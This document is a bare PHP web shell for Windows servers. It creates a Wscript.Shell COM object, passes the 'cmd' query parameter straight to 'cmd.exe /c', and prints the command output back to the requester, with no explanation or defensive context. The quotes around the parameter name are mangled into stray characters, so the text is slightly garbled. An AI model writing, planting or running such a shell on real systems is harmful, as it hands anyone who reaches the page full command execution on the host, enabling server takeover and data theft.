<?php 
$phpwsh=new COM("Wscript.Shell") or die("Create Wscript.Shell Failed!"); 
$exec=$phpwsh->exec("cmd.exe /c ".$_GET[¡¯cmd¡¯].""); 
$stdout = $exec->StdOut(); 
$stroutput = $stdout->ReadAll(); 
echo $stroutput; 

?>  